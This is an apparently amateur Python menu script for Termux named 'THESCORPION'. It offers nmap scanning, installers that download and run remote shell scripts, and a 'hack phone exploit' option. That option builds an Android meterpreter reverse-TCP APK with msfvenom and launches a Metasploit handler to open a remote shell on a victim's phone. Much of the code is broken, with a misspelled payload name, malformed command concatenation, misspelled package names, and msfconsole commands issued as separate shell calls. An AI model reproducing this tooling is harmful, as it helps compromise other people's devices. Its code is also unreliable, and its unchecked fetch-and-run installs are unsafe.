import time
import os
print ("\033[01;33m_______ _    _ ______  _____  _____ ____  _____  _____ _____ ____  _   _")
time.sleep(1)
print ("\033[01;31m|__   __| |  | |  ____|/ ____|/ ____/ __ \|  __ \|  __ \_   _/ __ \| \ | |")
time.sleep(1)
print ("\033[01;34m| |  | |__| | |__  | (___ | |   | |  | | |__) | |__) || || |  | |  \| |")
time.sleep(1)
print ("\033[01;32m| |  |  __  |  __|  \___ \| |   | |  | |  _  /|  ___/ | || |  | | . ` |")
time.sleep(1)
print ("\033[01;33m| |  | |  | | |____ ____) | |___| |__| | | \ \| |    _| || |__| | |\  |")
time.sleep(1)
print ("\033[01;31m|_|  |_|  |_|______|_____/ \_____\____/|_|  \_\_|   |_____\____/|_| \_|")
logomhs = """\033[01;31m
███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░THESCORPION░░░░░░│██
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████
	  """
print (logomhs)
THESCORPION=  '''
\033[01;31m[0] \033[01;31m hack phone exploit
\033[01;31m[1] \033[01;34mscan a port open for website or ip
\033[01;34m[2] \033[01;31mscan a ip for website
\033[01;32m[3] install metasploit
\033[01;31m[4] instsll all start and remove problem
\033[01;31m[5] install Kali Linux
\033[01;34m[6] install debian
\033[01;32m[7] install Kali Linux nethunter
\033[01;31m[8] install fedora
\033[01;32m[9] EXIT
            '''
print (THESCORPION)

number = int(input("\033[01;34m | ENTER NUMBER==>"))
if number == 1:
    web = input('\033[01;34m | ENTER a WEBSITE or ip==>')
    os.system("nmap" + " " + web)
elif number == 2:
    website = input('\033[01;34m | ENTER a WEBSITE==>')
    os.system("ping" + " " + website)
elif number == 3:
    os.system("pkg install ruby")
    os.system("wget https://Auxilus.github.io/metasploit.sh")
    os.system("bash metasploit.sh")
elif number == 4:
    os.system("pkg update && pkg upgrade -y")
    os.system("pkg install python")
    os.system("pkg install pytho2")
    os.system("pkg install python3")
    os.system("pkg install bash")
    os.system("pkg install php")
    os.system("pkg install git")
    os.system("pkg install wget")
    os.system("pkg install curl")
    os.system("pkg install ruby")
    os.system("pkg install unzip")
    os.system("pkg install nano")
    os.system("pkg install proot")
    os.system("pkg install openssh")
    os.system("pkg install pip")
    os.system("pkg install pip2")
    os.system("termux-chroot")
    os.system("pip install mechanez")
    os.system("pip install requestes")
   
elif number == 5:
    os.system(" pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh && bash kali.sh")
elif number == 6: 
    os.system("pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Debian/debian.sh && bash debian.sh")
elif number == 7: 
    os.system("pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Nethunter/nethunter.sh && bash nethunter.sh")
elif number == 8:
    os.system("pkg install wget openssl-tool proot tar -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Fedora/fedora.sh && bash fedora.sh")
elif number == 0:
    HOST = input("ENTER YOUR IP====>")
    PORT = input("ENTER YOUR PORT====>")
    APK = input("ENTER THE NAME APK for injcton====>")
    print ("please wait.....")
    time.sleep(2)
    os.system("msfvenom -p android/meterpreter/revers_tcp LHOST=" + HOST +"LPORT="+PORT +" > R /sdcard/" + APK)
    os.system("msfconsole;use exploit/multi/handler;set payload android/meterpreter/reverse_tcp")
    os.system("set lhost" + HOST)
    os.system("set lport" + PORT)
    os.system("exploit")

print ("Done see you soon...*_-")
THESCORPION = """
|______________________________________
|script made by:\n	                       	       |
|====>maskun                                             |
|channel telegram:\n		                          |
|===>https://t.me/xomhg31                      |
|______________________________________|
"""
print (THESCORPION)

